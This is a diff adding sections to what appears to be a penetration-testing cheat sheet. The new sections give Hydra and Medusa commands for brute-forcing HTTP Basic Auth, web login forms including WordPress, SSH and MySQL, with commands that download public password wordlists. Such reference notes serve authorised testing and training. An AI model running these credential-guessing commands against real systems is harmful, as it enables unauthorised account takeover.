@@ -252,6 +252,68 @@ hydra -L user.list -P password.list mysql://10.129.42.197
 mysql -h 10.129.42.197 -u user -p
 ```
 
+### HTTP Basic Authentication
+```bash
+# Hydra Basic Auth on default port
+hydra -l admin -P password.list target.com http-get /admin
+
+# Custom port and path
+hydra -l basic-auth-user -P passwords.txt 127.0.0.1 http-get / -s 81
+
+# Multiple users with specific path
+hydra -L usernames.txt -P passwords.txt target.com http-get /protected
+
+# With verbose output
+hydra -l admin -P rockyou.txt target.com http-get /admin -V
+
+# Fast mode (stop after first success)
+hydra -l admin -P passwords.txt target.com http-get /login -f
+```
+
+### HTTP Form-Based Authentication
+```bash
+# 1. Form Analysis (use browser developer tools)
+# - Check form method (POST/GET)
+# - Identify field names (username, password, etc.)
+# - Note failure/success messages
+
+# Generic login form
+hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+# With custom port
+└─$ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/2023-200_most_used_passwords.txt -f 94.237.54.192 -s 48750 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+# Success condition (redirect)
+hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+
+# Success condition (content match)
+hydra -L usernames.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
+
+# WordPress specific
+hydra -l admin -P passwords.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
+
+# With additional form fields (CSRF, hidden fields)
+hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^&csrf_token=abc123:F=Login failed"
+
+# Fast mode (stop on first success)
+hydra -L usernames.txt -P passwords.txt -f target.com http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+```
+
+#### Recommended Wordlists
+```bash
+# Download useful SecLists wordlists
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
+curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+
+# Common username lists
+/usr/share/seclists/Usernames/top-usernames-shortlist.txt
+/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+# Common password lists  
+/usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
+/usr/share/wordlists/rockyou.txt
+```
+
 ### VNC Brute Force
 ```bash
 # NetExec VNC
@@ -260,6 +322,52 @@ netexec vnc 10.129.42.197 -u user.list -p password.list
 # Hydra VNC
 hydra -P password.list vnc://10.129.42.197
 ```
+
+## Alternative Tool: Medusa
+
+### Medusa Quick Reference
+```bash
+# Basic syntax: medusa [target_options] [credential_options] -M module [module_options]
+
+# SSH brute force
+medusa -h 192.168.1.100 -U usernames.txt -P passwords.txt -M ssh
+
+# Multiple targets
+medusa -H targets.txt -U usernames.txt -P passwords.txt -M ssh
+
+# HTTP Basic Auth
+medusa -h target.com -U users.txt -P passwords.txt -M http -m GET
+
+# MySQL database
+medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql
+
+# Empty/default password testing
+medusa -h target.com -U users.txt -e ns -M ssh  # -e n (empty) -e s (same as username)
+
+# Fast mode (stop after first success)
+medusa -h target.com -U users.txt -P passwords.txt -M ssh -f
+
+# Threading control
+medusa -h target.com -U users.txt -P passwords.txt -M ssh -t 4
+
+# Verbose output
+medusa -h target.com -U users.txt -P passwords.txt -M ssh -v 4
+```
+
+### Medusa vs Hydra
+```bash
+# Medusa advantages:
+# - Better error handling
+# - Cleaner output
+# - Built-in empty password testing
+
+# Hydra advantages:  
+# - More modules available
+# - HTTP form support
+# - More flexible syntax
+```
+
+---
 
 ## Attack Strategies
 
